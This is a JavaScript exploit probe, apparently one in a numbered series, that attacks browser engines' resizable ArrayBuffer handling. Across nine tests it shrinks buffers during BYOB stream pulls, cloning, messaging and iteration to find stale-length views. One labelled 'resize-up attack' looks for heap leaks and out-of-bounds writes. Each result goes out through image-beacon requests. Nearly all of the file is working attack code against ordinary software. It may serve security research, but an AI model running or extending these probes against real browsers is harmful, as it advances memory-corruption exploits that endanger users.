// p350 - RAB TOCTOU + BYOB reader + stale length exploitation
// Tests: BYOB reader resize during pull, TypedArray.from OOB, iterator OOB,
//        structuredCloneForStream explicit-length stale clone + resize-up,
//        Array.from on OOB view
// Beacon prefix: V350-

(function() {
  var BQ = 0;
  function B(tag) {
    try { new Image().src = '/beacon/V350-' + tag + '?t=' + Date.now() + '&q=' + (BQ++); } catch(e) {}
  }

  B('BOOT');

  try { new ArrayBuffer(8, {maxByteLength: 64}); } catch(e) { B('NO-RAB'); return; }

  // === TEST 1: BYOB reader resize during pull ===
  // The pullIntoDescriptor stores stale byteOffset/byteLength.
  // After resize, the result view is created with stale params.
  try {
    var byobDone = false;
    var byobResult = null;
    var rab1 = new ArrayBuffer(2048, {maxByteLength: 16384});
    var src1 = new Uint8Array(rab1);
    for (var i = 0; i < 2048; i++) src1[i] = 0xDD;

    var pullCalled = false;
    var stream1 = new ReadableStream({
      type: 'bytes',
      pull: function(controller) {
        if (pullCalled) return;
        pullCalled = true;
        B('T1-PULL');
        var req = controller.byobRequest;
        if (!req) { B('T1-NO-BYOB-REQ'); return; }

        var reqView = req.view;
        B('T1-REQ-VIEW-LEN-' + reqView.byteLength);

        // Write some data
        for (var w = 0; w < Math.min(64, reqView.byteLength); w++)
          reqView[w] = 0xEE;

        // RESIZE DOWN during pull
        try {
          rab1.resize(16);
          B('T1-RESIZED-' + rab1.byteLength);
        } catch(e) {
          B('T1-RESIZE-ERR-' + e.message.substring(0, 30));
        }

        // Respond with the pre-resize byte count
        try {
          req.respond(64);
          B('T1-RESPOND-OK');
        } catch(e) {
          B('T1-RESPOND-ERR-' + e.message.substring(0, 40));
        }
      }
    });

    try {
      var reader1 = stream1.getReader({mode: 'byob'});
      B('T1-BYOB-READER-OK');

      var view1 = new Uint8Array(rab1, 0, 1024);
      reader1.read(view1).then(function(res) {
        B('T1-READ-DONE-' + res.done);
        if (res.value) {
          B('T1-RESULT-LEN-' + res.value.byteLength);
          B('T1-RESULT-BUFLEN-' + res.value.buffer.byteLength);
          if (res.value.byteLength > 16) {
            B('T1-OOB-READ-' + res.value.byteLength);
          }
        } else {
          B('T1-NO-VALUE');
        }
      }).catch(function(e) {
        B('T1-READ-ERR-' + e.message.substring(0, 40));
      });
    } catch(e) {
      B('T1-BYOB-ERR-' + e.message.substring(0, 40));
    }
  } catch(e) { B('T1-ERR-' + e.message.substring(0, 30)); }

  // === TEST 2: TypedArray.from() with OOB explicit-length source ===
  // If from() uses lengthRaw() instead of length(), it reads OOB
  try {
    var rab2 = new ArrayBuffer(2048, {maxByteLength: 8192});
    var src2 = new Float64Array(rab2, 0, 256);
    for (var i = 0; i < 256; i++) src2[i] = 2000 + i;

    rab2.resize(16);
    B('T2-SRC-LEN-' + src2.length);

    var result2 = Float64Array.from(src2);
    B('T2-FROM-LEN-' + result2.length);
    if (result2.length > 2) {
      B('T2-OOB-FROM-' + result2.length);
      var sum = 0;
      for (var j = 0; j < Math.min(32, result2.length); j++) sum += result2[j];
      B('T2-SUM-' + sum);
    } else if (result2.length > 0) {
      B('T2-PARTIAL-' + result2[0]);
    } else {
      B('T2-EMPTY');
    }
  } catch(e) { B('T2-ERR-' + e.message.substring(0, 40)); }

  // === TEST 3: Array.from() on OOB explicit-length view ===
  // Array.from uses the iterable protocol or length property
  try {
    var rab3 = new ArrayBuffer(512, {maxByteLength: 4096});
    var src3 = new Uint32Array(rab3, 0, 128);
    for (var i = 0; i < 128; i++) src3[i] = 3000 + i;

    rab3.resize(16);
    B('T3-SRC-LEN-' + src3.length);

    var arr3 = Array.from(src3);
    B('T3-ARR-LEN-' + arr3.length);
    var nonUndef = 0;
    for (var k = 0; k < arr3.length; k++) {
      if (arr3[k] !== undefined) nonUndef++;
    }
    B('T3-NONDEF-' + nonUndef);
    if (arr3.length > 4) B('T3-OOB-ARRAY-' + arr3.length);
  } catch(e) { B('T3-ERR-' + e.message.substring(0, 40)); }

  // === TEST 4: Spread operator on OOB view ===
  try {
    var rab4 = new ArrayBuffer(256, {maxByteLength: 4096});
    var src4 = new Uint8Array(rab4, 0, 256);
    for (var i = 0; i < 256; i++) src4[i] = 0xCC;

    rab4.resize(8);
    B('T4-SRC-LEN-' + src4.length);

    var spread4 = [];
    try {
      spread4 = eval('[...src4]');
      B('T4-SPREAD-LEN-' + spread4.length);
      if (spread4.length > 8) B('T4-OOB-SPREAD-' + spread4.length);
    } catch(e) {
      B('T4-SPREAD-ERR-' + e.message.substring(0, 40));
    }
  } catch(e) { B('T4-ERR-' + e.message.substring(0, 30)); }

  // === TEST 5: for...of iteration on OOB view ===
  try {
    var rab5 = new ArrayBuffer(256, {maxByteLength: 4096});
    var src5 = new Uint8Array(rab5, 0, 256);
    for (var i = 0; i < 256; i++) src5[i] = 0xBB;

    rab5.resize(8);
    B('T5-SRC-LEN-' + src5.length);

    var iterCount = 0;
    var iterVals = [];
    try {
      for (var val of src5) {
        iterCount++;
        if (iterCount <= 16) iterVals.push(val);
        if (iterCount > 300) break;
      }
      B('T5-ITER-COUNT-' + iterCount);
      if (iterCount > 8) B('T5-OOB-ITER-' + iterCount);
    } catch(e) {
      B('T5-ITER-ERR-' + e.message.substring(0, 40));
    }
  } catch(e) { B('T5-ERR-' + e.message.substring(0, 30)); }

  // === TEST 6: Response.clone + resize-up (combine V330 + V345) ===
  // structuredCloneForStream uses lengthRaw() for explicit-length views
  // Clone buffer is resizable. Resize clone buffer UP after reading.
  try {
    var rab6 = new ArrayBuffer(2048, {maxByteLength: 16384});
    var src6 = new Float64Array(rab6, 0, 256);
    for (var i = 0; i < 256; i++) src6[i] = 6000 + i;

    var ctrl6;
    var stream6 = new ReadableStream({
      start: function(c) { ctrl6 = c; }
    });
    ctrl6.enqueue(src6);
    ctrl6.close();

    // Resize DOWN before creating Response
    rab6.resize(16);
    B('T6-RESIZED-' + rab6.byteLength);

    var resp6 = new Response(stream6);
    B('T6-RESP-OK');

    resp6.clone().body.getReader().read().then(function(res) {
      if (res.done || !res.value) { B('T6-CLONE-EMPTY'); return; }
      var chunk = res.value;
      B('T6-CHUNK-TYPE-' + (chunk instanceof Float64Array ? 'F64' : typeof chunk));

      if (!(chunk instanceof Float64Array)) {
        B('T6-NOT-F64');
        return;
      }

      var cbuf = chunk.buffer;
      B('T6-PRE-LEN-' + chunk.length);
      B('T6-PRE-BUFLEN-' + cbuf.byteLength);
      B('T6-PRE-BUFMAX-' + (cbuf.maxByteLength || -1));
      B('T6-RESIZABLE-' + (cbuf.maxByteLength > cbuf.byteLength));

      // THE RESIZE-UP ATTACK
      if (cbuf.maxByteLength > cbuf.byteLength) {
        try {
          cbuf.resize(2048);
          B('T6-RESIZE-UP-' + cbuf.byteLength);
          B('T6-POST-LEN-' + chunk.length);

          if (chunk.length === 256) {
            B('T6-STALE-LEN-CONFIRMED');

            // Read data: [0..1] = memcpy'd, [2..255] = fresh pages
            var vals = [];
            for (var r = 0; r < 8; r++) vals.push(r + ':' + chunk[r]);
            B('T6-VALS-' + vals.join('|'));

            // Check for non-zero past memcpy
            var nz = 0;
            for (var z = 2; z < 256; z++) if (chunk[z] !== 0) nz++;
            B('T6-NONZERO-' + nz);
            if (nz > 0) B('T6-HEAP-LEAK');

            // Write test
            chunk[100] = 99999.99;
            B('T6-WRITE-' + (chunk[100] === 99999.99 ? 'OK' : 'FAIL'));

            // Now resize DOWN and try to use the stale-length view
            cbuf.resize(16);
            B('T6-SHRUNK-LEN-' + chunk.length);

            // Can we pass this stale-length view to anything dangerous?
            // Try TypedArray.from on the now-OOB clone view
            var fromClone = Float64Array.from(chunk);
            B('T6-FROM-CLONE-LEN-' + fromClone.length);

            B('T6-CONFIRMED');
          } else if (chunk.length === 0) {
            B('T6-STILL-OOB-AFTER-RESIZE');
          } else {
            B('T6-UNEXPECTED-LEN-' + chunk.length);
          }
        } catch(e) {
          B('T6-RESIZE-ERR-' + e.message.substring(0, 40));
        }
      } else {
        B('T6-NOT-RESIZABLE');
      }
    }).catch(function(e) {
      B('T6-ERR-' + e.message.substring(0, 40));
    });
  } catch(e) { B('T6-ERR-' + e.message.substring(0, 30)); }

  // === TEST 7: structuredClone of explicit-length OOB view ===
  // Does JS structuredClone also use lengthRaw?
  try {
    var rab7 = new ArrayBuffer(2048, {maxByteLength: 8192});
    var src7 = new Float64Array(rab7, 0, 256);
    for (var i = 0; i < 256; i++) src7[i] = 7000 + i;

    rab7.resize(16);
    B('T7-SRC-LEN-' + src7.length);

    try {
      var clone7 = structuredClone(src7);
      B('T7-CLONE-LEN-' + clone7.length);
      B('T7-CLONE-BUFLEN-' + clone7.buffer.byteLength);
      B('T7-CLONE-BUFMAX-' + (clone7.buffer.maxByteLength || -1));
      if (clone7.length > 2) B('T7-OOB-CLONE-' + clone7.length);
    } catch(e) {
      B('T7-CLONE-ERR-' + e.message.substring(0, 40));
    }
  } catch(e) { B('T7-ERR-' + e.message.substring(0, 30)); }

  // === TEST 8: postMessage to self with resizable view ===
  try {
    var rab8 = new ArrayBuffer(1024, {maxByteLength: 8192});
    var src8 = new Uint32Array(rab8, 0, 256);
    for (var i = 0; i < 256; i++) src8[i] = 8000 + i;

    rab8.resize(16);
    B('T8-SRC-LEN-' + src8.length);

    var mc = new MessageChannel();
    mc.port1.onmessage = function(ev) {
      var d = ev.data;
      B('T8-MSG-TYPE-' + (d instanceof Uint32Array ? 'U32' : typeof d));
      if (d instanceof Uint32Array) {
        B('T8-MSG-LEN-' + d.length);
        B('T8-MSG-BUFLEN-' + d.buffer.byteLength);
        B('T8-MSG-BUFMAX-' + (d.buffer.maxByteLength || -1));
        if (d.length > 4) B('T8-OOB-MSG-' + d.length);
      }
    };

    try {
      mc.port2.postMessage(src8);
      B('T8-POST-OK');
    } catch(e) {
      B('T8-POST-ERR-' + e.message.substring(0, 40));
    }
  } catch(e) { B('T8-ERR-' + e.message.substring(0, 30)); }

  // === TEST 9: TypedArray.set from explicit-length OOB source ===
  // set() uses integerIndexedObjectLength which should return nullopt for OOB
  // But what if there's a codepath difference for explicit vs auto length?
  try {
    var rab9 = new ArrayBuffer(2048, {maxByteLength: 8192});
    var src9 = new Uint8Array(rab9, 0, 2048);
    for (var i = 0; i < 2048; i++) src9[i] = 0xAA;

    var dst9 = new Uint8Array(4096);
    rab9.resize(16);
    B('T9-SRC-LEN-' + src9.length);

    try {
      dst9.set(src9);
      B('T9-SET-OK-DSTLEN-' + dst9.length);
      var sum9 = 0;
      for (var j = 0; j < 64; j++) sum9 += dst9[j];
      B('T9-SUM64-' + sum9);
      if (sum9 > 0) B('T9-DATA-COPIED-' + sum9);
    } catch(e) {
      B('T9-SET-ERR-' + e.message.substring(0, 40));
    }
  } catch(e) { B('T9-ERR-' + e.message.substring(0, 30)); }

  B('DONE');
  setTimeout(function() { B('TIMEOUT'); }, 20000);
})();
